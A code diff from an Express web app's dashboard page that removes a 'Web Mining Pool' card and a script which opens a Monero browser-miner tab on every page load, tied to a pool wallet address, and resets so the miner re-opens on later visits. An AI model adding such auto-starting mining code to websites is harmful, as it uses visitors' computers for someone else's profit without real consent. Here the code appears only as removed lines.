@@ -1163,29 +1163,6 @@ app.get('/', (req, res) => {
       <div id="miner-leaderboard"><div class="stat"><span class="label">Loading...</span></div></div>
     </div>
     <div class="card">
-      <h3>Web Mining Pool</h3>
-      <div style="display:flex;gap:6px;margin-bottom:8px;">
-        <input id="miner-alias" type="text" placeholder="Your alias (optional)" 
-          style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid #2a2a3a;background:#1a1a2a;color:#e0e0f0;font-size:13px;outline:none;"
-          onkeyup="localStorage.setItem('miner_alias',this.value)">
-      </div>
-      <div class="stat"><span class="label">Status</span><span class="value" id="miner-status" style="color:#4ade80;">connecting...</span></div>
-      <div class="stat"><span class="label">Your Hashrate</span><span class="value" id="browser-hash">-</span></div>
-      <div class="stat"><span class="label" style="color:#4ade80;font-weight:600;">Web Pool XMR</span><span class="value" id="browser-xmr" style="color:#4ade80;font-weight:700;">loading...</span></div>
-      <div class="stat"><span class="label">Network Effect</span><span class="value" id="network-effect" style="color:#fbbf24;">waiting for peers...</span></div>
-      <div style="margin-top:8px;font-size:11px;color:#6b6b80;">
-        <span>Mining auto-starts when you visit — close tab to stop.</span>
-        &middot;
-        <a href="https://xmrtrig.vercel.app" target="_blank" style="color:#60a5fa;">Open miner</a>
-        &middot;
-        <a href="https://supportxmr.com/#/workers/46UxNFuGM2E3UwmZWWJicaRPoRwqwW4byQkaTHkX8yPcVihp91qAVtSFipWUGJJUyTXgzSqxzDQtNLf2bsp2DX2qCCgC5mg" target="_blank" style="color:#60a5fa;">Pool</a>
-      </div>
-      <div style="margin-top:10px;border-top:1px solid #2a2a3a;padding-top:8px;">
-        <div style="font-size:11px;color:#8b8ba0;margin-bottom:4px;">TOP CONTRIBUTORS</div>
-        <div id="miner-leaderboard"><div class="stat"><span class="label">Loading...</span></div></div>
-      </div>
-    </div>
-    <div class="card">
       <h3>Relay Status</h3>
       <div class="stat"><span class="label">Uptime</span><span class="value">${uptimeStr}</span></div>
       <div class="stat"><span class="label">Relay</span><span class="value">v5.0.0</span></div>
@@ -1524,44 +1501,6 @@ app.get('/', (req, res) => {
   }
   loadMiningLeaderboard();
   setInterval(loadMiningLeaderboard, 15000);
-
-  // Auto-start miner on page load
-  (function() {
-    var alias = localStorage.getItem('miner_alias') || ('web-' + Math.random().toString(36).slice(2,8));
-    var minerTab = localStorage.getItem('miner_tab_opened');
-    var statusEl = document.getElementById('miner-status');
-    var hashEl = document.getElementById('browser-hash');
-    var netEl = document.getElementById('network-effect');
-    
-    // Check if miner was already spawned in this session
-    if (!minerTab || minerTab !== 'true') {
-      // Open miner in new tab
-      var win = window.open('https://xmrtrig.vercel.app/?alias=' + encodeURIComponent(alias), 'xmrt-miner');
-      if (win) {
-        localStorage.setItem('miner_tab_opened', 'true');
-        if (statusEl) statusEl.textContent = 'mining';
-        if (hashEl) hashEl.textContent = 'active in miner tab';
-        if (netEl) netEl.textContent = 'miner tab opened — contributions active';
-      } else {
-        // Popup blocked — show link
-        if (statusEl) statusEl.textContent = 'popup blocked — click link below';
-        if (netEl) netEl.textContent = 'allow popup or click Open miner';
-      }
-    } else {
-      if (statusEl) statusEl.textContent = 'miner running in tab';
-      if (hashEl) hashEl.textContent = 'see pool stats';
-      if (netEl) netEl.textContent = 'miner active — close tab to stop';
-    }
-    
-    // Restore alias input
-    var input = document.getElementById('miner-alias');
-    if (input && alias) input.value = alias;
-  })();
-  
-  // Reset miner tab state on page unload (so next visit re-opens)
-  window.addEventListener('beforeunload', function() {
-    localStorage.removeItem('miner_tab_opened');
-  });
 
   // Party Favor Photo inbox refresh (brief — lightweight)
   function loadPfpInbox() {
